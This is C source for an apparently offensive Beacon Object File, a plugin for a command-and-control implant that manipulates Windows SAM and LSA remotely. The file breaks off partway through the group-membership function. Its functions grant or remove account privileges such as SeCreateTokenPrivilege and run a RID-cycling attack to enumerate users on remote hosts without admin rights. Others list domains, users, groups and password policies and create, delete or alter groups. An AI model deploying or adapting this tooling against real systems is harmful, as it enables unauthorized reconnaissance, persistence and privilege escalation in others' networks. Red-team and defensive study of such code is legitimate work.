#include <sammy.h>
#include "utils.c"

/*
 * some useful resources I read to make this BOF:
 * lsa functions: https://doxygen.reactos.org/d8/d29/dll_2win32_2advapi32_2sec_2lsa_8c.html
 * sam functions: https://doxygen.reactos.org/d2/de6/samlib_8c.html
 * Windows Security Internals book by James Forshaw: https://nostarch.com/windows-security-internals
 * reversed (using DnSpy) NtObjectManager dll by James Forshaw to implement things he had already implemented
 * https://www.powershellgallery.com/packages/NtObjectManager/2.0.1
 */

/*!
 * @brief
 * 	add/remove logon/privileges rights to an account
 * 	can add/remove a privilege such as SeCreateTokenPrivilege
 * 	or a logon right such as SeInteractiveLogonRight
 * 	rights are documented here https://learn.microsoft.com/en-us/windows/win32/secauthz/authorization-constants
 *
 * @param ServerName
 *	the MS-LSAD server to connect to
 *
 * @param DomainName
 *	the domain to query
 *
 * @param Username
 *	the object name to add/remove rights
 *
 * @param UserRights
 *	the right to add/remove
 *
 * @param Add
 *	if true it adds the privilege, otherwise it removes it
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyUserChangeAccountRights(
	PUNICODE_STRING ServerName,
	PUNICODE_STRING DomainName,
	PUNICODE_STRING Username,
	PUNICODE_STRING UserRights,
	BOOL Add
) {

	NTSTATUS                    Status     = { 0 };
	OBJECT_ATTRIBUTES           ObjAttr    = { 0 };
	HANDLE                      Policy     = { 0 };
	UNICODE_STRING              DomainUser = { 0 };
	PLSA_REFERENCED_DOMAIN_LIST Domain     = { 0 };
	PLSA_TRANSLATED_SID2        UserSid    = { 0 };

	// open the policy
	if ( ! NT_SUCCESS( Status = ADVAPI32$LsaOpenPolicy(
		ServerName,
		& ObjAttr,
		POLICY_CREATE_ACCOUNT | POLICY_LOOKUP_NAMES,
		& Policy
	) ) ) {
		PRINT_NT_ERROR( "LsaOpenPolicy", Status );
		return Status;
	}

	// concat the username and the domain
	// setup memory
	DomainUser.Length        = ( DomainName->Length + Username->Length ) + sizeof( WCHAR );
	DomainUser.MaximumLength = DomainUser.Length + sizeof( WCHAR );
	DomainUser.Buffer        = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, DomainUser.MaximumLength );

	// concat
	MemCpy( DomainUser.Buffer, DomainName->Buffer, DomainName->Length );
	* ( PWCHAR ) ( C_PTR( DomainUser.Buffer ) + DomainName->Length ) = L'\\';
	MemCpy( C_PTR( DomainUser.Buffer ) + DomainName->Length + sizeof( WCHAR ), Username->Buffer, Username->Length );

	// convert the username to a SID
	if ( ! NT_SUCCESS( Status = ADVAPI32$LsaLookupNames2(
		Policy,
		0,
		1,
		& DomainUser,
		& Domain,
		& UserSid
	) ) ) {
		PRINT_NT_ERROR( "LsaLookupNames2", Status );
		goto END;
	}

	if ( Add ) {
		// add the privilege
		if ( ! NT_SUCCESS( Status = ADVAPI32$LsaAddAccountRights( Policy, UserSid->Sid, UserRights, 1 ) ) ) {
			PRINT_NT_ERROR( "LsaAddAcountRights", Status );
			goto END;
		}

		BeaconPrintf(
			CALLBACK_OUTPUT,
			"=> Successfully added privilege %ls to %ls\n", UserRights->Buffer, DomainUser.Buffer
		);
	} else {
		// remove the privilege
		if ( ! NT_SUCCESS( Status = ADVAPI32$LsaRemoveAccountRights( Policy, UserSid->Sid, FALSE, UserRights, 1 ) ) ) {
			if ( Status == 0xC0000034 ) {
				BeaconPrintf(
					CALLBACK_OUTPUT, "%ls does not have the %ls privilege\n", DomainUser.Buffer, UserRights->Buffer
				);
			} else {
				PRINT_NT_ERROR( "LsaRemoveAccountRights", Status );
			}

			goto END;
		}

		BeaconPrintf(
			CALLBACK_OUTPUT,
			"=> Successfully removed privilege %ls from %ls\n", UserRights->Buffer, DomainUser.Buffer
		);
	}

	END:
	if ( Policy ) NTDLL$NtClose( Policy );
	if ( DomainUser.Buffer ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, DomainUser.Buffer );
	if ( Domain ) ADVAPI32$LsaFreeMemory( Domain );
	if ( UserSid ) ADVAPI32$LsaFreeMemory( UserSid );

	return Status;
}

/*!
 * @brief
 * 	enum account rights of an account
 * 	this includes privileges and logon rights
 *
 * @param ServerName
 *	the MS-LSAD server to connect to
 *
 * @param DomainName
 *	the domain to query
 *
 * @param Username
 *	the object name to list rights
 *
 * @return
 */
NTSTATUS SammyUserEnumAccountRights(
	PUNICODE_STRING ServerName,
	PUNICODE_STRING DomainName,
	PUNICODE_STRING Username
) {

	OBJECT_ATTRIBUTES           ObjAttr    = { 0 };
	NTSTATUS                    Status     = { 0 };
	HANDLE                      Policy     = { 0 };
	PLSA_REFERENCED_DOMAIN_LIST Domain     = { 0 };
	PLSA_TRANSLATED_SID2        UserSid    = { 0 };
	UNICODE_STRING              DomainUser = { 0 };
	PUNICODE_STRING             UserRights = { 0 };
	ULONG                       NbrRights  = { 0 };

	// open the policy
	if ( ! NT_SUCCESS( ADVAPI32$LsaOpenPolicy( ServerName, & ObjAttr, POLICY_LOOKUP_NAMES, & Policy ) ) ) {
		PRINT_NT_ERROR( "LsaOpenPolicy", Status );
		return Status;
	}

	// concat the username and the domain
	// setup memory
	DomainUser.Length        = ( DomainName->Length + Username->Length ) + sizeof( WCHAR );
	DomainUser.MaximumLength = DomainUser.Length + sizeof( WCHAR );
	DomainUser.Buffer        = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, DomainUser.MaximumLength );

	// concat
	MemCpy( DomainUser.Buffer, DomainName->Buffer, DomainName->Length );
	* ( PWCHAR ) ( C_PTR( DomainUser.Buffer ) + DomainName->Length ) = L'\\';
	MemCpy( C_PTR( DomainUser.Buffer ) + DomainName->Length + sizeof( WCHAR ), Username->Buffer, Username->Length );

	// convert the username to a SID
	if ( ! NT_SUCCESS( Status = ADVAPI32$LsaLookupNames2(
		Policy,
		0,
		1,
		& DomainUser,
		& Domain,
		& UserSid
	) ) ) {
		PRINT_NT_ERROR( "LsaLookupNames2", Status );
		goto END;
	}

	// enum the account rights
	Status = ADVAPI32$LsaEnumerateAccountRights( Policy, UserSid->Sid, & UserRights, & NbrRights );
	if ( Status == 0xC0000034 ) {
		// 0xC0000034 => the object name was not found => no right assigned to this specific object
		BeaconPrintf( CALLBACK_OUTPUT, "%ls does not have any special logon right!\n", DomainUser.Buffer );
		goto END;
	} else if ( ! NT_SUCCESS( Status ) ) {
		PRINT_NT_ERROR( "LsaEnumerateAccountRights", Status );
		goto END;
	}

	// print the account rights
	BeaconPrintf( CALLBACK_OUTPUT, "Logon rights:\n" );
	for ( INT Cnt = 0 ; Cnt < NbrRights ; Cnt ++ ) {
		BeaconPrintf( CALLBACK_OUTPUT, "=> %ls\n", UserRights[ Cnt ].Buffer );
	}

	END:
	if ( Policy ) NTDLL$NtClose( Policy );
	if ( DomainUser.Buffer ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, DomainUser.Buffer );
	if ( Domain ) ADVAPI32$LsaFreeMemory( Domain );
	if ( UserSid ) ADVAPI32$LsaFreeMemory( UserSid );
	if ( UserRights ) ADVAPI32$LsaFreeMemory( UserRights );

	return Status;
}

/*!
 * @brief
 * perform a rid cycling attack to enumerate users on remote system
 * this can also be used to enumerate users on the local systems but there is no point
 * to enumerate users on the local systems you should use the SammyObjectList functions
 * rid cycling is interesting on remote systems because it does not require administrative privs
 * on the remote system to perform the attack. To connect to a remote system SAM db using the SAMR protocol
 * you need administrator privs
 *
 * @param ServerName
 *	the MS-LSAD server to connect to
 *
 * @param DomainName
 *	the domain to query
 *
 * @param RidMin
 *	minimum rid for the attack
 *
 * @param RidMax
 * 	maximum rid for the attack
 *
 * @return
 */
NTSTATUS SammyRidCycling(
	PUNICODE_STRING ServerName,
	PUNICODE_STRING DomainName,
	ULONG RidMin,
	ULONG RidMax
) {
	OBJECT_ATTRIBUTES           ObjAttr         = { 0 };
	HANDLE                      Policy          = { 0 };
	NTSTATUS                    Status          = { 0 };
	PLSA_REFERENCED_DOMAIN_LIST Domain          = { 0 };
	SID_CUSTOM                  Sid             = { 0 };
	PSID                        DomainSid       = { 0 };
	UNICODE_STRING              DomainSidSddl   = { 0 };
	PLSA_REFERENCED_DOMAIN_LIST Domain2         = { 0 };
	PLSA_TRANSLATED_NAME        ObjName         = { 0 };
	PSID                        SidPtr          = { 0 };
	WCHAR                       Names[MAX_PATH] = { 0 };

	// open the policy
	if ( ! NT_SUCCESS( Status = ADVAPI32$LsaOpenPolicy( ServerName, & ObjAttr, POLICY_LOOKUP_NAMES, & Policy ) ) ) {
		PRINT_NT_ERROR( "LsaOpenPolicy", Status );
		return Status;
	}

	// use LsaLookupNames2 to get the domain sid
	if ( ! NT_SUCCESS( Status = ADVAPI32$LsaLookupNames2(
		Policy,
		0,
		1,
		DomainName,
		& Domain,
		( PSID ) & DomainSid
	) ) ) {
		PRINT_NT_ERROR( "LsaLookupNames2", Status );
		goto END;
	}

	// get the sid of the domain from the LSA_REFERENCED_DOMAIN_LIST struct
	// convert it to SDDL
	if ( ! NT_SUCCESS( Status = NTDLL$RtlConvertSidToUnicodeString( & DomainSidSddl, Domain->Domains->Sid, TRUE ) ) ) {
		PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", Status );
		goto END;
	}

	Sid.SubAuthorityCount   = ( ( PISID ) ( Domain->Domains->Sid ) )->SubAuthorityCount;
	Sid.IdentifierAuthority = ( ( PISID ) ( Domain->Domains->Sid ) )->IdentifierAuthority;
	Sid.Revision            = ( ( PISID ) ( Domain->Domains->Sid ) )->Revision;

	if ( Sid.SubAuthorityCount > 10 ) {

		/*
		 * anyone knows how to circuvent this in c?
		 * would have been easily to solve in C++ with templates
		 * Because the PSID struct does not use PDWORD is uses DWORD []
		 * So the array is dynamically allocated in the struct thanks to a template
		 * Could use some dirty sddl conversation but not really up for that
		 */
		BeaconPrintf( CALLBACK_ERROR, "[!] Bof not designed SIDs with more than 10 sub-authorities!" );
		return STATUS_BUFFER_TOO_SMALL;
	}

	// copy all the sub authorities
	for ( BYTE i = 0 ; i < Sid.SubAuthorityCount ; i ++ ) {
		Sid.SubAuthority[ i ] = ( ( PISID ) ( Domain->Domains->Sid ) )->SubAuthority[ i ];
	}

	// we gonna add our own rid
	Sid.SubAuthorityCount ++;
	SidPtr = & Sid;

	// iterate through all rids
	for ( ULONG Rid = RidMin ; Rid < RidMax ; Rid ++ ) {

		// forge complete sid for objects (sid-rid)
		Sid.SubAuthority[ Sid.SubAuthorityCount - 1 ] = Rid;

		if ( ! NT_SUCCESS( Status = ADVAPI32$LsaLookupSids2( Policy, 0, 1, & SidPtr, & Domain2, & ObjName ) ) &&
			 Status != 0xC0000073 ) {
			PRINT_NT_ERROR( "LsaLookupSids2", Status );
			return Status;
		} else if ( Status != 0xC0000073 ) {

			// names in ObjName are not null terminated
			MemCpy( Names, ObjName->Name.Buffer, ObjName->Name.MaximumLength );
			C_DEF08( ( C_PTR( Names ) + ObjName->Name.MaximumLength ) ) = '\0';
			BeaconPrintf( CALLBACK_OUTPUT, "=> %ls - %ls-%lu\n", Names, DomainSidSddl.Buffer, Rid );
		}

		// lookup the name for that sid
		ADVAPI32$LsaFreeMemory( Domain2 );
		ADVAPI32$LsaFreeMemory( ObjName );
	}


	END:
	if ( Policy ) NTDLL$NtClose( Policy );
	if ( Domain )ADVAPI32$LsaFreeMemory( Domain );
	if ( DomainSid )ADVAPI32$LsaFreeMemory( DomainSid );
	if ( DomainSidSddl.Buffer )NTDLL$RtlFreeUnicodeString( & DomainSidSddl );

	return Status;
}

/*!
 * @brief
 *	list the available domains of a MS-SAMR server
 *
 * @param ServerName
 *	the MS-SAMR server to connect to
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyDomainsList(
	IN PUNICODE_STRING ServerName
) {

	NTSTATUS               Status     = { 0 };
	HANDLE                 Server     = { 0 };
	SAM_ENUMERATE_HANDLE   EnumCtx    = { 0 };
	PSAMPR_RID_ENUMERATION Buffer     = { 0 };
	ULONG                  DomainsNbr = { 0 };
	PSID                   DomainSid  = { 0 };
	UNICODE_STRING         SidSddl    = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// enum the domains for that server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamEnumerateDomainsInSamServer(
		Server,
		& EnumCtx,
		( PVOID ) & Buffer,
		( ULONG ) - 1,
		& DomainsNbr
	) ) ) {
		PRINT_NT_ERROR( "SamEnumerateDomainsInSamServer", Status );
		goto CLEAN;
	}

	// print all domain names
	for ( int i = 0 ; i < DomainsNbr ; i ++ ) {

		// get the sid of the domain server
		if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, & Buffer[ i ].Name, & DomainSid ) ) ) {
			PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
			goto CLEAN;
		}

		// get the sid in sddl format
		if ( ! NT_SUCCESS( Status = NTDLL$RtlConvertSidToUnicodeString( & SidSddl, DomainSid, TRUE ) ) ) {
			PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", Status );
			goto CLEAN;
		}

		//MSVCRT$printf( "[+] Found domain => %ls - %ls\n", Buffer[ i ].Name.Buffer, SidSddl.Buffer );
		BeaconPrintf( CALLBACK_OUTPUT, "[+] Found domain => %ls - %ls\n", Buffer[ i ].Name.Buffer, SidSddl.Buffer );

		// free the domain sid unicode string
		NTDLL$RtlFreeUnicodeString( & SidSddl );
		SAMLIB$SamFreeMemory( DomainSid );
	}

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( DomainSid ) SAMLIB$SamFreeMemory( Buffer );

	return Status;
}

/*!
 * @brief
 *	get the password policy of a domain
 *	TODO: finish it
 *
 * @param ServerName
 *	MS-SAMR server to connect to
 *
 * @param DomainName
 *	domain to enum
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyDomainGetPasswordPolicy(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName
) {

	NTSTATUS                     Status    = { 0 };
	HANDLE                       Server    = { 0 };
	HANDLE                       Domain    = { 0 };
	PSID                         DomainSid = { 0 };
	PDOMAIN_PASSWORD_INFORMATION DomnInfo  = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return Status;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, MAXIMUM_ALLOWED, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// query the domain information
	if ( ! NT_SUCCESS( Status = SAMLIB$SamQueryInformationDomain(
		Domain,
		DomainPasswordInformation,
		( PVOID * ) & DomnInfo
	) ) ) {
		PRINT_NT_ERROR( "SamQueryInformationDomain", Status );
		goto CLEAN;
	}

	/*
	 * todo: add min/max password age & query lockout information using
	 * SamQueryInformationDomain with DomainLockoutInformation class
	 * and SAMPR_DOMAIN_LOCKOUT_INFORMATION struct
	 */
	BeaconPrintf(
		CALLBACK_OUTPUT,
		"[*] Domain information:\n"
		"=> Minimum password length: %d\n"
		"=> Password history length: %d\n"
		"=> Properties:\n",
		DomnInfo->MinPasswordLength, DomnInfo->PasswordHistoryLength
	);

	if ( DomnInfo->PasswordProperties & DOMAIN_PASSWORD_COMPLEX )
		BeaconPrintf( CALLBACK_OUTPUT, "\t- DOMAIN_PASSWORD_COMPLEX\n" );
	if ( DomnInfo->PasswordProperties & DOMAIN_PASSWORD_NO_CLEAR_CHANGE )
		BeaconPrintf( CALLBACK_OUTPUT, "\t- DOMAIN_PASSWORD_NO_CLEAR_CHANGE\n" );
	if ( DomnInfo->PasswordProperties & DOMAIN_PASSWORD_STORE_CLEARTEXT )
		BeaconPrintf( CALLBACK_OUTPUT, "\t- DOMAIN_PASSWORD_STORE_CLEARTEXT\n" );

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( DomnInfo ) SAMLIB$SamFreeMemory( DomnInfo );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );

	return Status;
}

/*!
 * @brief
 * 	list the groups/users of a domain
 *
 * @param ServerName
 * 	MS-SAMR server to connect to
 * @param DomainName
 * 	domain to enum users from
 *
 * @param SamObject
 *	enum group or user
 *
 * @return
 * ntstatus
 */
NTSTATUS SammyObjectsList(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN enum SAM_OBJECT SamObject
) {

	NTSTATUS               Status     = { 0 };
	HANDLE                 Server     = { 0 };
	HANDLE                 Domain     = { 0 };
	PSID                   DomainSid  = { 0 };
	SAM_ENUMERATE_HANDLE   EnumCtx    = { 0 };
	PSAMPR_RID_ENUMERATION Objects    = { 0 };
	ULONG                  ObjectsNbr = { 0 };
	UNICODE_STRING         SidSddl    = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, DOMAIN_LIST_ACCOUNTS, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// enumerate the users in the domain
	switch ( SamObject ) {
		case SAMMY_GROUP:
			if ( ! NT_SUCCESS( Status = SAMLIB$SamEnumerateAliasesInDomain(
				Domain,
				& EnumCtx,
				( PVOID * ) & Objects,
				( ULONG ) - 1,
				& ObjectsNbr
			) ) ) {
				PRINT_NT_ERROR( "SamEnumerateUsersInDomain", Status );
				goto CLEAN;
			}
			break;
		case SAMMY_USER:
			if ( ! NT_SUCCESS( Status = SAMLIB$SamEnumerateUsersInDomain(
				Domain,
				& EnumCtx,
				0,
				( PVOID * ) & Objects,
				( ULONG ) - 1,
				& ObjectsNbr
			) ) ) {
				PRINT_NT_ERROR( "SamEnumerateUsersInDomain", Status );
				goto CLEAN;
			}
			break;
		default:
			// unexpected value
			goto CLEAN;
	}

	// get the domain sid in sddl format
	if ( ! NT_SUCCESS( Status = NTDLL$RtlConvertSidToUnicodeString( & SidSddl, DomainSid, TRUE ) ) ) {
		PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", Status );
		goto CLEAN;
	}

	for ( int i = 0 ; i < ObjectsNbr ; i ++ ) {
		BeaconPrintf(
			CALLBACK_OUTPUT,
			"=> %ls\\%ls - %ls-%ld\n", DomainName->Buffer, Objects[ i ].Name.Buffer, SidSddl.Buffer,
			Objects[ i ].RelativeId
		);
	}

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( Objects ) SAMLIB$SamFreeMemory( Objects );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );
	if ( SidSddl.Buffer ) NTDLL$RtlFreeUnicodeString( & SidSddl );

	return Status;
}

/*!
 * @brief
 * 	list the members of a group (alias obj)
 *
 * @param ServerName
 * 	MS-SAMR server to connect to
 *
 * @param DomainName
 *	target domain
 *
 * @param Groupname
 *	group to list members of
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyGroupListMembers(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Groupname
) {
	NTSTATUS       Status     = { 0 };
	HANDLE         Server     = { 0 };
	HANDLE         Domain     = { 0 };
	HANDLE         Alias      = { 0 };
	PSID           DomainSid  = { 0 };
	ULONG          MembersCnt = { 0 };
	UNICODE_STRING SidSddl    = { 0 };
	PWCHAR         Domn       = { 0 };
	PWCHAR         Group      = { 0 };
	ULONG          GroupLen   = { 0 };
	ULONG          DomnLen    = { 0 };
	SID_NAME_USE   SidType    = { 0 };
	PSID_NAME_USE  SidUse     = { 0 };
	PULONG         Rid        = { 0 };
	PSID * Members = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, MAXIMUM_ALLOWED, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// lookup the groupname to get the rid and pass it
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupNamesInDomain( Domain, 1, Groupname, & Rid, & SidUse ) ) ) {
		PRINT_NT_ERROR( "SamLookupNamesInDomain", Status );
		goto CLEAN;
	}

	// get a handle onto the alias
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenAlias( Domain, ALIAS_LIST_MEMBERS, * Rid, & Alias ) ) ) {
		PRINT_NT_ERROR( "SamOpenAlias", Status );
		goto CLEAN;
	}

	// get the alias members
	if ( ! NT_SUCCESS( Status = SAMLIB$SamGetMembersInAlias( Alias, & Members, & MembersCnt ) ) ) {
		PRINT_NT_ERROR( "SamGetMembersInAlias", Status );
		goto CLEAN;
	}

	for ( int i = 0 ; i < MembersCnt ; i ++ ) {

		// todo: resolve sids but ADVAPI32$LookupAccountSidW always crash, idk why
		/*
		GroupLen = DomnLen = SidType = 0;

		ADVAPI32$LookupAccountSidW( ServerName->Buffer, Members[ i ], NULL, & GroupLen, NULL, & DomnLen, & SidType );

		SidType = 0;

		GroupLen = ( GroupLen + DomnLen + 2 ) * sizeof( WCHAR );
		Group    = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, GroupLen );
		Domn     = Group + DomnLen + 1;
		Group[ DomnLen ] = '\\';

		// resolve the sid to a name
		if ( ! ADVAPI32$LookupAccountSidW(
			ServerName->Buffer,
			Members[ i ],
			Group,
			& GroupLen,
			Domn,
			& DomnLen,
			& SidType
		) ) {
			PRINT_WIN32_ERROR( "LookupAccountSidW" );
			goto CLEAN;
		}
		*/

		// convert the sid to sddl
		if ( ! NT_SUCCESS( Status = NTDLL$RtlConvertSidToUnicodeString( & SidSddl, Members[ i ], TRUE ) ) ) {
			PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", Status );
			goto CLEAN;
		}

		BeaconPrintf( CALLBACK_OUTPUT, "=> %ls\n", SidSddl.Buffer );

		// free the sddl sid unicode string and the group name
		NTDLL$RtlFreeUnicodeString( & SidSddl );
	}

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( Alias ) NTDLL$NtClose( Alias );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );
	if ( DomainSid ) SAMLIB$SamFreeMemory( Members );

	return Status;
}

/*!
 * @brief
 * 	create a group
 *
 * @param ServerName
 * 	MS-SAMR server to connect to
 *
 * @param DomainName
 *	target domain
 *
 * @param Groupname
 * 	group to create
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyGroupCreate(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Groupname
) {

	NTSTATUS Status    = { 0 };
	HANDLE   Server    = { 0 };
	HANDLE   Domain    = { 0 };
	HANDLE   Group     = { 0 };
	PSID     DomainSid = { 0 };
	ULONG    Rid       = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, DOMAIN_CREATE_ALIAS, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// create the group
	if ( ! NT_SUCCESS( Status = SAMLIB$SamCreateAliasInDomain(
		Domain,
		Groupname,
		MAXIMUM_ALLOWED,
		& Group,
		& Rid
	) ) ) {
		PRINT_NT_ERROR( "SamCreateAliasInDomain", Status );
		goto CLEAN;
	}

	BeaconPrintf( CALLBACK_OUTPUT, "Successfully created group %ls\\%ls", DomainName->Buffer, Groupname->Buffer );

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( Group ) NTDLL$NtClose( Group );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );

	return Status;
}

/*!
 * @brief
 *	delete a group
 *
 * @param ServerName
 *	MS-SAMR server to connect to
 *
 * @param DomainName
 *  target domain
 *
 * @param Groupname
 * 	group to delete
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyGroupDelete(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Groupname
) {
	NTSTATUS      Status    = { 0 };
	HANDLE        Server    = { 0 };
	HANDLE        Domain    = { 0 };
	HANDLE        Group     = { 0 };
	PSID          DomainSid = { 0 };
	PSID_NAME_USE SidType   = { 0 };
	PULONG        Rid       = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, MAXIMUM_ALLOWED, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// lookup the groupname to get the rid and pass it
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupNamesInDomain( Domain, 1, Groupname, & Rid, & SidType ) ) ) {
		PRINT_NT_ERROR( "SamLookupNamesInDomain", Status );
		goto CLEAN;
	}

	// get a handle onto the sam alias
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenAlias( Domain, MAXIMUM_ALLOWED, * Rid, & Group ) ) ) {
		PRINT_NT_ERROR( "SamOpenAlias", Status );
		goto CLEAN;
	}

	// delete the sam user
	if ( ! NT_SUCCESS( Status = SAMLIB$SamDeleteAlias( Group ) ) ) {
		PRINT_NT_ERROR( "SamDeleteAlias", Status );
		goto CLEAN;
	}

	BeaconPrintf( CALLBACK_OUTPUT, "Successfully removed group %ls\\%ls", DomainName->Buffer, Groupname->Buffer );

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( Group ) NTDLL$NtClose( Group );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );

	return Status;
}

/*!
 * @brief
 * 	add an object to a group
 *
 * @param ServerName
 *  MS-SAMR server to connect to
 *
 * @param DomainName
 * 	target domain
 *
 * @param Groupname
 *	group to add an object to
 *
 * @param NewMemberSidSddl
 * 	sid in sddl format of the object to add to the group
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyGroupAddMember(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Groupname,
	IN PCHAR NewMemberSidSddl
) {

	PSID          NewMemberSid = { 0 };
	NTSTATUS      Status       = { 0 };
	HANDLE        Server       = { 0 };
	HANDLE        Domain       = { 0 };
	HANDLE        Group        = { 0 };
	PSID          DomainSid    = { 0 };
	PSID_NAME_USE SidType      = { 0 };
	PULONG        Rid          = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, MAXIMUM_ALLOWED, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// lookup the groupname to get the rid and pass it
